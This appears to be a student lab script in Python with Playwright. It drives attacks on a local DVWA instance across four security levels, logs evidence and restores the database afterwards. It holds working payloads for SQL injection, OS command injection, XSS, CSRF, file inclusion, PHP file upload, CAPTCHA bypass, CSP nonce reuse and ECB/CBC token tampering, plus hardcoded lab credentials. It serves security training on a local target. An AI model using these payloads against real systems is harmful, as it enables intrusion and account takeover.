"""Tests locaux DVWA des quatre niveaux, preuves et restauration ciblée."""
from pathlib import Path
import argparse,base64,codecs,hashlib,json,re,subprocess,time,datetime,threading,http.server,functools
from urllib.parse import urlencode,quote,urlparse
from playwright.sync_api import sync_playwright
R=Path(__file__).resolve().parents[1]
ap=argparse.ArgumentParser();ap.add_argument('--modules',nargs='*');ap.add_argument('--levels',nargs='*',default=['low','medium','high','impossible']);ap.add_argument('--run',default=datetime.datetime.now().strftime('%Y%m%d-%H%M%S'));args=ap.parse_args()
OUT=R/'evidence/security-levels'/args.run;IMG=R/'docs/captures/security-levels'/args.run
OUT.mkdir(parents=True,exist_ok=True);IMG.mkdir(parents=True,exist_ok=True)
BASE='http://127.0.0.1:4280'; WPORT=4292
MODULES=['sqli','sqli_blind','exec','xss_r','xss_s','xss_d','csrf','fi','upload','authbypass','bac','brute','weak_id','captcha','csp','javascript','open_redirect','cryptography','api']
results=[];current={};contexts=[];uploads=[];tempfiles=[]
def docker(*cmd,input=None):
 r=subprocess.run(['docker','compose',*cmd],cwd=R,input=input,stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True);return r.stdout

def sql(q):return docker('exec','-T','reference-db','mariadb','-udvwa','-pp@ssw0rd','--batch','--raw','--skip-column-names','dvwa',input=q.encode()).decode().strip()
def dump(table):return docker('exec','-T','reference-db','mariadb-dump','-udvwa','-pp@ssw0rd','--no-create-info','--replace','--skip-add-locks','--skip-comments','--skip-extended-insert','dvwa',table)
users_snapshot=dump('users');(OUT/'users-before.sql').write_bytes(users_snapshot)
full=docker('exec','-T','reference-db','mariadb-dump','-udvwa','-pp@ssw0rd','--skip-comments','dvwa');(OUT/'reference-before.sql').write_bytes(full)
# Ne restaurer que les champs utilisateurs modifiés par nos scénarios.
users_original=sql('SELECT user_id,HEX(first_name),HEX(last_name),HEX(password),failed_login,HEX(last_login) FROM users ORDER BY user_id').splitlines()
def restore_users():
 for line in users_original:
  uid,first,last,pwd,failed,login=line.split('\t');sql(f"UPDATE users SET first_name=UNHEX('{first}'),last_name=UNHEX('{last}'),password=UNHEX('{pwd}'),failed_login={failed},last_login="+("NULL" if login=='NULL' else f"UNHEX('{login}')")+f' WHERE user_id={uid}')
guestmax=int(sql('SELECT COALESCE(MAX(comment_id),0) FROM guestbook'))
bac_exists=sql("SHOW TABLES LIKE 'bac_log'");bacmax=int(sql('SELECT COALESCE(MAX(id),0) FROM bac_log')) if bac_exists else 0
metadata={'run':args.run,'started':datetime.datetime.now().isoformat(),'base':BASE,'levels':args.levels,'modules':args.modules or MODULES,'backup':'reference-before.sql'}
(OUT/'metadata.json').write_text(json.dumps(metadata,indent=2))
class Quiet(http.server.SimpleHTTPRequestHandler):
 def log_message(self,*a):pass
wdir=OUT/'witness';wdir.mkdir(exist_ok=True)
(wdir/'destination.html').write_text('<meta charset="utf-8"><h1>GROUPE 12 — Destination témoin locale</h1><p>Test de redirection entre ports locaux.</p>')
(wdir/'csrf.html').write_text(f'''<meta charset="utf-8"><h1>GROUPE 12 — Origine témoin CSRF</h1><form action="{BASE}/vulnerabilities/csrf/" method="get"><input name="password_new" value="G12-Levels-2026!"><input name="password_conf" value="G12-Levels-2026!"><input name="Change" value="Change"><button>Déclencher le test</button></form>''')
server=http.server.ThreadingHTTPServer(('127.0.0.1',WPORT),functools.partial(Quiet,directory=str(wdir)));threading.Thread(target=server.serve_forever,daemon=True).start()
def save_results(): (OUT/'results.json').write_text(json.dumps(results,ensure_ascii=False,indent=2))
def note(text):current.setdefault('observations',[]).append(text)
def event(label,**data):current.setdefault('checks',[]).append({'label':label,**data})
def mark(status,reason):current['verdict']=status;current['summary']=reason

def req(c,path,method='GET',form=None,data=None,headers=None):
 url=path if path.startswith('http') else BASE+path
 kw={'method':method,'timeout':20000,'max_redirects':5}
 if form is not None:kw['form']=form
 if data is not None:kw['data']=data
 if headers:kw['headers']=headers
 r=c.request.fetch(url,**kw)
 idx=len(current.setdefault('http',[]))+1; name=f"{current['module']}-{current['level']}-{idx:02}.http.txt"
 try:body=r.text()
 except Exception:body='[contenu binaire]'
 (OUT/name).write_text(f'{method} {url}\nForm: {form}\nData: {data}\nHeaders: {headers}\n\nHTTP {r.status} {r.url}\n'+json.dumps(r.headers,ensure_ascii=False)+'\n\n'+body)
 current['http'].append(name);return r

def login(level,user='admin',password='password'):
 c=browser.new_context(viewport={'width':1280,'height':960});contexts.append(c)
 # Nos scripts ne chargent que les origines du laboratoire.
 c.route('**/*',lambda route: route.continue_() if urlparse(route.request.url).hostname in ('127.0.0.1','localhost',None) else route.abort())
 p=c.new_page();p.set_default_timeout(10000)
 p.on('dialog',lambda dialog:(current.setdefault('dialogs',[]).append(dialog.message),dialog.dismiss()))
 p.goto(BASE+'/login.php');p.locator('[name=username]').fill(user);p.locator('[name=password]').fill(password);p.locator('[name=Login]').click()
 if 'login.php' in p.url:raise RuntimeError('Connexion échouée : '+user)
 c.add_cookies([{'name':'security','value':level,'url':BASE}]);return c,p

def go(p,m,params=None):
 r=p.goto(BASE+'/vulnerabilities/'+m+'/'+('?' + urlencode(params) if params else ''));p.wait_for_load_state('domcontentloaded');return r

def tokens(p):return {n.get_attribute('name'):n.get_attribute('value') or '' for n in p.locator('input[type=hidden][name]').all()}
def submit(p,values,method='POST',url=None):
 # Soumission réelle de formulaire et attente explicite de la navigation.
 with p.expect_navigation(wait_until='domcontentloaded'):
  p.evaluate('''({values,method,url})=>{const f=document.createElement('form');f.method=method;f.action=url||location.href;for(const [k,v] of Object.entries(values)){const i=document.createElement('input');i.name=k;i.value=v;f.append(i)}document.body.append(f);f.submit()}''',{'values':values,'method':method,'url':url})

def snap(p,label):
 p.wait_for_timeout(120)
 name=f"{current['module']}-{current['level']}-{len(current.setdefault('captures',[]))+1:02}-{label}.png";p.screenshot(path=str(IMG/name),full_page=True)
 body=p.locator('body').inner_text();(OUT/name.replace('.png','.txt')).write_text(body)
 current['captures'].append({'file':name,'url':p.url,'label':label});return body

def fresh(p,m,values,method='POST'):
 go(p,m);v=tokens(p);v.update(values);submit(p,v,method)

def sqli(level,blind=False):
 m='sqli_blind' if blind else 'sqli';c,p=login(level)
 def send(v):
  if level=='high':
   if blind:c.add_cookies([{'name':'id','value':v,'url':BASE}])
   else:req(c,'/vulnerabilities/sqli/session-input.php','POST',form={'id':v,'Submit':'Submit'})
   go(p,m)
  else:fresh(p,m,{'id':v,'Submit':'Submit'},'POST' if level=='medium' else 'GET')
  return p.locator('body').inner_text()
 normal=send('1');normal_ok=('User ID exists' in normal) if blind else normal.count('First name:')==1;snap(p,'normal')
 plain="1' AND '1'='1' #" if blind else "1' OR '1'='1' #"
 replay=send(plain);snap(p,'rejeu-low');event('rejeu-low',payload=plain,effect=('User ID exists' in replay if blind else replay.count('First name:')>1))
 if blind:
  a='1 AND 1=1' if level=='medium' else "1' AND '1'='1' #";b='1 AND 1=2' if level=='medium' else "1' AND '1'='2' #"
  true=send(a);snap(p,'vrai');false=send(b);snap(p,'faux');effect='User ID exists' in true and 'MISSING' in false;event('paire-adaptee',true=a,false=b,exists='User ID exists' in true,missing='MISSING' in false)
 else:
  payload='1 OR 1=1' if level=='medium' else plain;text=send(payload);effect=text.count('First name:')>1;snap(p,'adapte');event('adapte',payload=payload,users=text.count('First name:'))
 after=send('1');event('usage-normal',before=normal_ok,after=('User ID exists' in after if blind else after.count('First name:')==1))
 mark('effet confirmé' if effect else 'rejet observé',f"Nous observons {'la différence booléenne injectée' if blind and effect else 'une sélection élargie' if effect else 'le rejet des entrées testées'} ; usage normal initial : {normal_ok}.")

def command(level):
 c,p=login(level);m='exec';fresh(p,m,{'ip':'127.0.0.1','Submit':'Submit'});normal='bytes from' in snap(p,'normal');effect=False
 for label,payload in [('rejeu-low','127.0.0.1; printf G12_LEVEL_COMMAND'),('adapte','127.0.0.1|printf G12_LEVEL_COMMAND')]:
  fresh(p,m,{'ip':payload,'Submit':'Submit'});t=snap(p,label);ok='G12_LEVEL_COMMAND' in p.locator('pre').inner_text();effect|=ok;event(label,payload=payload,effect=ok)
 fresh(p,m,{'ip':'127.0.0.1','Submit':'Submit'});event('usage-normal',before=normal,after='bytes from' in p.locator('body').inner_text());mark('effet confirmé' if effect else 'rejet observé',f'Nous observons le marqueur de commande : {effect} ; ping normal : {normal}.')

def xss(level,m):
 c,p=login(level);marker=73195;current['dialogs']=[]
 if m=='xss_s':
  fresh(p,m,{'txtName':'G12V3','mtxMessage':'G12V3 usage normal','btnSign':'Sign Guestbook'});normal='G12V3 usage normal' in snap(p,'normal')
 else:
  go(p,m,{'name':'Bonjour G12V3'} if m=='xss_r' else {'default':'French'});normal=('Bonjour G12V3' in p.locator('body').inner_text()) if m=='xss_r' else p.locator('select').count()>0;snap(p,'normal')
 payloads=[('rejeu-low',f'<script>alert({marker})</script>')]
 if m=='xss_s':payloads.append(('nom-adapte',f'<img src=x onerror=alert({marker})>'))
 elif m=='xss_r':payloads.append(('adapte',f'<img src=x onerror=alert({marker})>'))
 else:payloads=[('rejeu-low',f'</option></select><script>alert({marker})</script>'),('fragment-adapte',f'</option></select><img src=x onerror=alert({marker})>')]
 effect=False
 for label,payload in payloads:
  current['dialogs']=[]
  if m=='xss_s':
   fresh(p,m,{'txtName':payload if label=='nom-adapte' else 'G12V3','mtxMessage':'G12V3'+(' '+payload if label=='rejeu-low' else ' témoin'),'btnSign':'Sign Guestbook'})
   # La preuve porte sur une seconde session, sans nouvelle publication.
   c2,v=login(level);go(v,m);p2=v
  elif m=='xss_r':fresh(p,m,{'name':payload},'GET');p2=p
  else:
   url=BASE+'/vulnerabilities/xss_d/?default='+ (('French#'+quote(payload,safe='')) if label=='fragment-adapte' else quote(payload,safe=''));p.goto(url);p2=p
  p2.wait_for_timeout(250);ok=str(marker) in current['dialogs'];snap(p2,label);event(label,payload=payload,dialogs=list(current['dialogs']),effect=ok);effect|=ok
  if m=='xss_s':sql(f'DELETE FROM guestbook WHERE comment_id>{guestmax}');c2.close();contexts.remove(c2)
 if m=='xss_s':fresh(p,m,{'txtName':'G12V3','mtxMessage':'G12V3 après','btnSign':'Sign Guestbook'});after='G12V3 après' in p.locator('body').inner_text()
 else:go(p,m,{'name':'Bonjour G12V3'} if m=='xss_r' else {'default':'French'});after='Bonjour G12V3' in p.locator('body').inner_text() if m=='xss_r' else p.locator('select').count()>0
 event('usage-normal',before=normal,after=after);mark('effet confirmé' if effect else 'rejet observé',f'Nous observons une boîte de dialogue JavaScript issue de la charge : {effect}. Usage normal : {normal}/{after}.')

def csrf(level):
 c,p=login(level);go(p,'csrf');snap(p,'etat-initial');p.goto(f'http://127.0.0.1:{WPORT}/csrf.html');p.locator('button').click();snap(p,'origine-distincte')
 changed=sql("SELECT password=MD5('G12-Levels-2026!') FROM users WHERE user='admin'")=='1';event('attaque-sans-jeton',password_changed=changed)
 if changed:
  c2,v=login(level,password='G12-Levels-2026!');snap(v,'reconnexion');c2.close();contexts.remove(c2)
 restore_users();fresh(p,'csrf',{'password_new':'G12-Levels-2026!','password_conf':'G12-Levels-2026!','password_current':'password','Change':'Change'},'GET');normal=sql("SELECT password=MD5('G12-Levels-2026!') FROM users WHERE user='admin'")=='1';snap(p,'usage-legitime');restore_users()
 event('usage-normal',changed=normal,restored=True)
 if level=='impossible':
  fresh(p,'csrf',{'password_new':'G12-Levels-2026!','password_conf':'G12-Levels-2026!','password_current':'FAUX','Change':'Change'},'GET');snap(p,'mot-de-passe-courant-faux');event('courant-faux',changed=sql("SELECT password=MD5('G12-Levels-2026!') FROM users WHERE user='admin'")=='1')
 mark('effet confirmé' if changed else 'rejet observé',f'Nous constatons un changement sans jeton depuis une autre origine locale : {changed}. Le parcours légitime fonctionne : {normal}. Origines différentes, même site.')

def inclusion(level):
 c,p=login(level);go(p,'fi',{'page':'include.php'});normal='file1.php' in p.content();snap(p,'normal');effect=False
 for label,payload in [('rejeu-low','../../robots.txt'),('adapte','....//....//robots.txt' if level=='medium' else 'file:///var/www/html/robots.txt')]:
  go(p,'fi',{'page':payload});t=snap(p,label);ok='User-agent:' in t;effect|=ok;event(label,payload=payload,effect=ok)
 go(p,'fi',{'page':'include.php'});event('usage-normal',before=normal,after='file1.php' in p.content());mark('effet confirmé' if effect else 'rejet observé',f'Nous obtenons le contenu de robots.txt : {effect}. Usage normal : {normal}.')

def upload(level):
 c,p=login(level);m='upload';png=(R/'docs/video/fixtures/video.png').read_bytes()
 def send(name,mime,buf,label):
  go(p,m);p.locator('[name=uploaded]').set_input_files({'name':name,'mimeType':mime,'buffer':buf});p.locator('[name=Upload]').click();t=snap(p,label)
  accepted='succesfully uploaded' in t
  if accepted:
   links=p.locator('a[href*="hackable/uploads/"]').all();target=links[0].get_attribute('href').split('/')[-1] if links else name
   uploads.append(target)
  else:target=name
  return accepted,target
 normal,target=send('g12-v3-'+args.run+'-'+level+'.png','image/png',png,'image-legitime');effect=False
 for label,mime in [('rejeu-low','application/x-php'),('mime-adapte','image/png')]:
  name='g12-v3-'+args.run+'-'+level+'-'+label+'.php';accepted,target=send(name,mime,b"<?php echo 'G12_LEVEL_UPLOAD'; ?>",label)
  executed=False
  if accepted:
   r=p.goto(BASE+'/hackable/uploads/'+target);executed=p.locator('body').inner_text().strip()=='G12_LEVEL_UPLOAD';snap(p,label+'-execution')
  effect|=executed;event(label,mime=mime,accepted=accepted,executed=executed)
 event('usage-normal',accepted=normal);mark('effet confirmé' if effect else 'rejet observé',f'Nous confirmons une exécution PHP téléversée : {effect}. Image PNG légitime acceptée : {normal}.')

def auth(level):
 a,pa=login(level);go(pa,'authbypass');normal='Unauthorised' not in pa.locator('body').inner_text();snap(pa,'admin-legitime');c,p=login(level,'gordonb','abc123')
 p.goto(BASE+'/vulnerabilities/authbypass/get_user_data.php');t=snap(p,'lecture-compte-ordinaire');read='surname' in t and 'admin' in t
 r=req(c,'/vulnerabilities/authbypass/change_user_details.php','POST',data={'id':1,'first_name':'G12V3AUTH','surname':'admin'});written=sql("SELECT first_name FROM users WHERE user_id=1")=='G12V3AUTH';snap(p,'lecture-initiale-voir-journal-mutation');event('autorisation',read=read,write=written,mutation_response=r.text());restore_users()
 mark('effet confirmé' if read or written else 'rejet observé',f'Compte gordonb : lecture des utilisateurs={read} ; mutation du compte 1={written}, vérifiée en base puis restaurée. Usage administrateur={normal}.')

def bac(level):
 c,p=login(level,'gordonb','abc123');c.add_cookies([{'name':'user_id','value':'2','url':BASE}]);go(p,'bac',{'action':'view','user_id':'2','token':'user_token'});t=snap(p,'profil-propre');normal='User ID: 2' in t
 c.add_cookies([{'name':'user_id','value':'1','url':BASE}]);go(p,'bac',{'action':'view','user_id':'1'});t=snap(p,'cookie-falsifie');effect='User ID: 1' in t;event('cookie',effect=effect)
 go(p,'bac',{'action':'view','user_id':'1','token':'user_token'});t=snap(p,'jeton-statique');effect2='User ID: 1' in t;event('jeton-statique',effect=effect2)
 mark('effet confirmé' if effect or effect2 else ('rejet observé' if normal else 'limite fonctionnelle'),f'Nous obtenons le profil 1 avec cookie falsifié={effect}, avec jeton statique={effect2}. Profil propre accessible={normal}. Aucune fixation de session complète testée.')

def brute(level):
 c,p=login(level);out=[]
 passwords=['password','G12incorrect1','G12incorrect2','password'] if level!='impossible' else ['password','G12incorrect1','G12incorrect2','G12incorrect3','password']
 for i,pwd in enumerate(passwords):
  start=time.monotonic();fresh(p,'brute',{'username':'admin','password':pwd,'Login':'Login'},'POST' if level=='impossible' else 'GET');t=snap(p,'essai-'+str(i+1));ok='Welcome to the password protected area' in t;out.append(ok);event('essai',password=pwd,accepted=ok,seconds=round(time.monotonic()-start,2))
 if level=='impossible':
  restore_users();fresh(p,'brute',{'username':'admin','password':'password','Login':'Login'},'POST');event('apres-restauration-controlee',accepted='Welcome to the password protected area' in p.locator('body').inner_text());snap(p,'retour-legitime')
 mark('protection observée' if level=='impossible' and out[0] and not out[-1] else 'comportement mesuré',f'Nous observons les acceptations successives {out}. Échantillon limité ; restauration contrôlée des compteurs après le test, sans prétendre avoir attendu les 15 minutes.')

def weak(level):
 c,p=login(level);go(p,'weak_id');vals=[]
 for i in range(4):
  r=req(c,'/vulnerabilities/weak_id/','POST',form={'Generate':'Generate'});header=r.headers.get('set-cookie','');m=re.search(r'dvwaSession=([^;]+)',header);value=m.group(1) if m else None;vals.append(value);event('generation',value=value,header=header,time=time.time())
 go(p,'weak_id');snap(p,'module');accepted=[v for v in c.cookies() if v['name']=='dvwaSession'];event('cookie-navigateur',stored=accepted)
 if level=='low':predict=vals==['1','2','3','4']
 elif level=='medium':predict=all(v and abs(int(v)-int(time.time()))<15 for v in vals)
 elif level=='high':predict=vals==[hashlib.md5(str(i).encode()).hexdigest() for i in range(1,5)]
 else:predict=False
 mark('prévisibilité confirmée' if predict else 'génération observée',f'Nous relevons quatre valeurs Set-Cookie : {vals}. Correspondance au compteur/temps/hachage prédit={predict}. Le navigateur stocke {len(accepted)} cookie(s). L’aléa cryptographique est expliqué par la source, pas prouvé par quatre valeurs.')

def captcha(level):
 c,p=login(level);go(p,'captcha');snap(p,'configuration');form={'step':'2','password_new':'G12-Levels-2026!','password_conf':'G12-Levels-2026!','Change':'Change'}
 fresh(p,'captcha',form);snap(p,'rejeu-saut-etape');changed=sql("SELECT password=MD5('G12-Levels-2026!') FROM users WHERE user='admin'")=='1';event('step2',changed=changed);restore_users()
 if level=='medium':
  fresh(p,'captcha',dict(form,passed_captcha='true'));snap(p,'passed-captcha-falsifie');adapt=sql("SELECT password=MD5('G12-Levels-2026!') FROM users WHERE user='admin'")=='1';changed|=adapt;event('passed_captcha=true',changed=adapt)
 elif level in ('high','impossible'):
  go(p,'captcha');v=tokens(p);v.update(form);v.update({'g-recaptcha-response':'hidd3n_valu3','password_current':'password'})
  r=req(c,'/vulnerabilities/captcha/','POST',form=v,headers={'User-Agent':'reCAPTCHA'});event('branche-adaptee',status=r.status,response_excerpt=r.text()[-1000:]);adapt=sql("SELECT password=MD5('G12-Levels-2026!') FROM users WHERE user='admin'")=='1';changed|=adapt;event('branche-adaptee-etat',changed=adapt)
 if changed:
  a,pa=login(level,password='G12-Levels-2026!');snap(pa,'reconnexion');a.close();contexts.remove(a)
 restore_users();mark('effet confirmé' if changed else 'limite de configuration',f'Nous vérifions un changement du mot de passe : {changed}. Le parcours reCAPTCHA normal reste indisponible sans clés/accès externe ; aucune validation complète du contrôle CAPTCHA.')

def csp(level):
 c,p=login(level);go(p,'csp');effect=False
 if level in ('high','impossible'):
  p.locator('#solve').click();p.wait_for_function("document.querySelector('#answer').textContent==='15'");normal=True;snap(p,'calcul-legitime')
 else:normal=p.locator('form').count()>0;snap(p,'normal')
 if level=='low':
  payload=BASE+'/vulnerabilities/csp/source/jsonp.php?callback=alert';fresh(p,'csp',{'include':payload});p.wait_for_timeout(200);effect=bool(current.get('dialogs'));snap(p,'jsonp-meme-origine');event('jsonp-self',payload=payload,dialogs=current.get('dialogs',[]));note('Test local de script autorisé par self ; les hébergeurs externes ne sont pas testés.')
 else:
  payload='<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(73195)</script>';fresh(p,'csp',{'include':payload});p.wait_for_timeout(200);ok='73195' in current.get('dialogs',[]);snap(p,'nonce-reutilise');event('nonce',effect=ok);effect|=ok
  if level in ('high','impossible'):
   current['dialogs']=[];payload='<script src="source/jsonp.php?callback=alert"></script>';fresh(p,'csp',{'include':payload});p.wait_for_timeout(200);ok=bool(current.get('dialogs'));snap(p,'jsonp-route-exposee');event('jsonp-expose',effect=ok,dialogs=current.get('dialogs',[]));effect|=ok
 mark('effet confirmé' if effect else 'rejet observé',f'Nous observons une exécution de script via une entrée : {effect}. Usage normal={normal}. Le test JSONP cible une route locale existante, même si le bouton utilise une autre route.')

def javascript(level):
 c,p=login(level);go(p,'javascript');snap(p,'initial')
 if level=='impossible':mark('non applicable','Nous affichons la page qui indique explicitement qu’il n’existe pas de niveau impossible pour ce module.');return
 def token(l):
  if l=='low':return hashlib.md5(codecs.encode('success','rot_13').encode()).hexdigest()
  if l=='medium':return 'XXsuccessXX'[::-1]
  return hashlib.sha256((hashlib.sha256(('XX'+'success'[::-1]).encode()).hexdigest()+'ZZ').encode()).hexdigest()
 fresh(p,'javascript',{'phrase':'success','token':token('low')});snap(p,'jeton-low');event('jeton-low',accepted='Well done' in p.locator('body').inner_text())
 v=token(level);fresh(p,'javascript',{'phrase':'success','token':v});t=snap(p,'jeton-adapte');ok='Well done' in t;event('jeton-adapte',token=v,accepted=ok);mark('effet confirmé' if ok else 'à reprendre',f'Nous recalculons le jeton avec la logique de ce niveau : accepté={ok}. Ce défi client ne constitue pas une authentification serveur.')

def redirect(level):
 c,p=login(level);go(p,'open_redirect');snap(p,'module');route='/vulnerabilities/open_redirect/source/'+level+'.php'
 legitimate='1' if level=='impossible' else 'info.php?id=1';r=req(c,route+'?'+urlencode({'redirect':legitimate}));normal='info.php' in r.url;effect=False
 for label,target in [('rejeu-low',f'http://127.0.0.1:{WPORT}/destination.html'),('adapte',f'//127.0.0.1:{WPORT}/destination.html'+('?info.php' if level=='high' else ''))]:
  url=BASE+route+'?'+urlencode({'redirect':target});r=p.goto(url);t=snap(p,label);ok=urlparse(p.url).port==WPORT;effect|=ok;event(label,target=target,final=p.url,effect=ok)
 event('usage-normal',ok=normal);mark('effet confirmé' if effect else 'rejet observé',f'Nous atteignons le témoin sur un autre port : {effect}. Redirection légitime vers info.php={normal}. Route explicitement testée : {level}.php.')

def crypto(level):
 c,p=login(level);go(p,'cryptography')
 if level=='low':
  challenge=p.locator('textarea[readonly]').input_value();fresh(p,'cryptography',{'message':'hello','direction':'encode'});normal=p.locator('textarea#encoded').first.input_value();snap(p,'normal');fresh(p,'cryptography',{'message':challenge,'direction':'decode'});decoded=p.locator('textarea#encoded').first.input_value();snap(p,'decode');fresh(p,'cryptography',{'password':'Olifant'});t=snap(p,'connexion-defi');ok='Welcome back user' in t;event('xor',decoded=decoded,login=ok);mark('effet confirmé' if ok else 'à reprendre',f'Nous lisons le message décodé dans la valeur du textarea : {decoded}. Connexion au mini-défi={ok}.')
 elif level=='medium':
  ts=p.locator('textarea').all_text_contents();fresh(p,'cryptography',{'token':ts[1]});normal='Welcome' in p.locator('body').inner_text();snap(p,'jeton-original')
  blocks=[[s[i:i+32] for i in range(0,len(s),32)] for s in ts[:3]];payload=blocks[1][0]+blocks[2][1]+blocks[0][2]+''.join(blocks[1][3:]);fresh(p,'cryptography',{'token':payload});t=snap(p,'blocs-recombines');ok='Welcome administrator Sweep' in t;event('ecb',normal=normal,payload=payload,admin=ok);mark('effet confirmé' if ok else 'à reprendre',f'Nous recomposons les blocs des trois jetons ; administrator Sweep accepté={ok}. Jeton original accepté={normal}.')
 else:
  original=json.loads(p.locator('#token').input_value());route='/vulnerabilities/cryptography/source/check_token_'+level+'.php'
  def call(value,label):
   p.locator('#token').fill(json.dumps(value));p.locator('input[value=Submit]').click();p.wait_for_function("document.querySelector('#message').textContent.length>0");p.wait_for_timeout(200);t=snap(p,label);r=req(c,route,'POST',data=json.dumps(value),headers={'Content-Type':'application/json'});data=r.json();event(label,response=data,input=value);p.evaluate("document.querySelector('#message').textContent=''");return data
  orig=call(original,'original');modified=dict(original)
  if level=='high':
   iv=bytearray(base64.b64decode(original['iv']));iv[7]^=ord('2')^ord('1');modified['iv']=base64.b64encode(iv).decode()
  else:
   cipher=bytearray(base64.b64decode(original['token']));cipher[0]^=1;modified['token']=base64.b64encode(cipher).decode()
  changed=call(modified,'alteration');again=call(original,'original-apres');effect=changed.get('level')=='admin';mark('effet confirmé' if effect else 'protection observée',f"Original={orig}; altération={changed}; original rejoué={again}. "+('Modification ciblée de l’IV CBC, sans récupération complète par oracle.' if level=='high' else 'Altération de ciphertext rejetée avec format JSON/Base64 conservé.'))

def api(level):
 c,p=login(level);go(p,'api');snap(p,'module');root='/vulnerabilities/api/v2/'
 # Vérifier les mêmes routes sur chaque cookie ; leur logique ne dépend pas du niveau.
 r=req(c,root+'user/');normal=r.status==200;v1=req(c,'/vulnerabilities/api/v1/user/').json();exposed=all('password' in x for x in v1);p.goto(BASE+'/vulnerabilities/api/v1/user/');snap(p,'v1')
 before=req(c,root+'user/2').json();changed=req(c,root+'user/2','PUT',data={'name':'morph','level':0}).json();after=req(c,root+'user/2').json();p.goto(BASE+root+'user/2');snap(p,'relecture');event('versions-et-mutation',v1_hashes=exposed,before=before,response=changed,after=after)
 # Le endpoint ne renvoie pas stdout : vérifier un fichier témoin borné dans /tmp.
 normal_r=req(c,root+'health/connectivity','POST',data={'target':'127.0.0.1'});name='g12-level-'+args.run+'-'+level;path='/tmp/'+name;tempfiles.append(path)
 payload='127.0.0.1; printf G12_API_LEVEL > '+path
 response=req(c,root+'health/connectivity','POST',data={'target':payload});proof=docker('exec','-T','reference','cat',path).decode();(OUT/(name+'.txt')).write_text(proof);event('commande-api',normal=normal_r.text(),response=response.text(),payload=payload,container_file=path,content=proof);effect=proof=='G12_API_LEVEL'
 if level=='impossible':
  no=req(c,root+'order/');bad=req(c,root+'order/',headers={'Authorization':'Bearer invalide'})
  basic='Basic '+base64.b64encode(b'1471.dvwa.digi.ninja:ABigLongSecret').decode();r=req(c,root+'login/login','POST',form={'grant_type':'password','username':'mrbennett','password':'becareful'},headers={'Authorization':basic});tok=r.json();access=req(c,root+'order/',headers={'Authorization':'Bearer '+tok['access_token']});refresh=req(c,root+'login/refresh','POST',form={'grant_type':'refresh_token','refresh_token':tok['refresh_token']},headers={'Authorization':basic});event('authentification',without=no.status,invalid=bad.status,login=r.status,authorized=access.status,refresh=refresh.status)
 mark('effet confirmé',f'Nous observons les hachages v1={exposed}, level renvoyé={changed.get("level")}, level relu={after.get("level")}, commande confirmée par témoin en conteneur={effect}. Ces routes restent accessibles indépendamment du cookie de niveau. '+('Flux order sans jeton/avec jeton/renouvellement testé séparément.' if level=='impossible' else ''))

FNS={'sqli':lambda l:sqli(l),'sqli_blind':lambda l:sqli(l,True),'exec':command,'xss_r':lambda l:xss(l,'xss_r'),'xss_s':lambda l:xss(l,'xss_s'),'xss_d':lambda l:xss(l,'xss_d'),'csrf':csrf,'fi':inclusion,'upload':upload,'authbypass':auth,'bac':bac,'brute':brute,'weak_id':weak,'captcha':captcha,'csp':csp,'javascript':javascript,'open_redirect':redirect,'cryptography':crypto,'api':api}
try:
 with sync_playwright() as pw:
  paths=sorted(Path('/home/modou/.cache/ms-playwright').glob('chromium-*/chrome-linux64/chrome'));browser=pw.chromium.launch(executable_path=str(paths[-1]),headless=True,args=['--no-sandbox'])
  for m in (args.modules or MODULES):
   for level in args.levels:
    current={'module':m,'level':level,'date':datetime.datetime.now().isoformat(),'instance':BASE,'captures':[],'checks':[],'verdict':'en cours'}
    try:FNS[m](level)
    except Exception as e:
     current['verdict']='à reprendre';current['error']=str(e);current['summary']='Essai interrompu : '+str(e)[:500]
     if contexts:
      try:snap(contexts[-1].pages[0],'incident')
      except Exception:pass
    finally:
     for c in contexts:
      try:c.close()
      except Exception:pass
     contexts.clear();restore_users()
     if m=='xss_s':sql(f'DELETE FROM guestbook WHERE comment_id>{guestmax}')
     results.append(current);save_results();print(m,level,current['verdict'],current.get('summary','')[:200],flush=True)
  browser.close()
finally:
 restore_users()
 sql(f'DELETE FROM guestbook WHERE comment_id>{guestmax}')
 if bac_exists:sql(f'DELETE FROM bac_log WHERE id>{bacmax}')
 for name in uploads:
  if re.fullmatch(r'[a-zA-Z0-9_.-]+',name):docker('exec','-T','reference','php','-r',"unlink('/var/www/html/hackable/uploads/"+name+"');")
 for name in tempfiles:
  if re.fullmatch(r'/tmp/g12-level-[a-zA-Z0-9-]+',name):docker('exec','-T','reference','php','-r',"if(file_exists('"+name+"')) unlink('"+name+"');")
 server.shutdown();metadata['finished']=datetime.datetime.now().isoformat();metadata['users_restored']=users_original==sql('SELECT user_id,HEX(first_name),HEX(last_name),HEX(password),failed_login,HEX(last_login) FROM users ORDER BY user_id').splitlines();metadata['cleanup_uploads']=uploads;metadata['cleanup_tempfiles']=tempfiles
 (OUT/'metadata.json').write_text(json.dumps(metadata,ensure_ascii=False,indent=2));print('DONE',OUT,metadata['users_restored'],flush=True)
